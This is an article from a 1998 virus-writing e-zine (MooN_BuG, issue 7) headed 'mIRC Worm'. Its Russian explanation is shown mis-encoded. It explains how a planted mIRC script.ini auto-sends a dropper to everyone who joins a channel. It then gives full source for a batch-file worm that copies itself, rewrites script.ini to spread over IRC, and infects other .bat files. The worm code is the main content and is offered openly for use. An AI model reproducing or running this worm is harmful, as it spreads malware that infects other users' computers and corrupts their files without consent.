[TulaAnti&ViralClub] PRESENTS ...
MooN_BuG, Issue 7, Sep 1998                                           file 002

                                  mIRC Worm
                                            by FRiZER

[Begin(HOW_MIRC.TXT)]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

               Š ª à á¯à®áâà ­ïâìáï ç¥à¥§ irc (¨á¯®«ì§ãï mIRC)

        â ¯ë:
        ‚ ª â «®£¥ mIRC'a (C:\mirc ­ ¯à¨¬¥à) ­ å®¤¨¬ ä ©« script.ini.
        …á«¨ ¥£® ­¥â â® á®§¤ ¥¬ ¥£®.
        ¨è¥¬ ¢ ­¥£® ¯ àã áâà®ç¥ª:

        [script]
        n0=on 1:JOIN:#:/dcc send $nick C:\mirc\sex.com

        ‘®§¤ ¥¬ ¤à®¯¯¥à (§¤¥áì - C:\mirc\sex.com)

        ‚ à¥§ã«ìâ â¥ ¥á«¨ § «¥§âì ­  irc â® íâ®â ä ©« (sex.com)
        ¡ã¤¥â ®âáë« âìáï ¢á¥¬, ªâ® § ©¤¥â ­  íâ®â ª ­ «, ¯®ª  ¢ë â ¬.

    PS: â® ¢á¥ ­¥ ï ¯à¨¤ã¬ «, ï ¤ ¦¥ mIRC ¨ ¢ £« §  ­¥ ¢¨¤ « ;)

[End(HOW_MIRC.TXT)]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

[Begin(MIRCDEMO.BAT)]³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³
@echo off
goto ~%1
:~
md \x
if exist %0 goto A
copy %0.bat \x\x.bat>nul
copy %0.bat c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0.bat
:A
copy %0 \x\x.bat>nul
copy %0 c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0
:~A
if exist *.bad goto ~G
echo @echo Bad command or filename>%2
echo @del \x\x.bat>>%2
echo @rd \x>>%2
for %%a in (*.bat) do copy %%a *.bad>nul
for %%a in (*.bat) do copy %0 %%a>nul
%2 R
:~G
for %%a in (*.bat) do ren %%a *.but>nul
for %%a in (*.bad) do copy %%a *.bat>nul
call %2
del *.bat
for %%a in (*.but) do ren %%a *.bat
%2 R
:~R
del \x\x.bat
rd \x
:~E
[End(MIRCDEMO.BAT)]³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³³
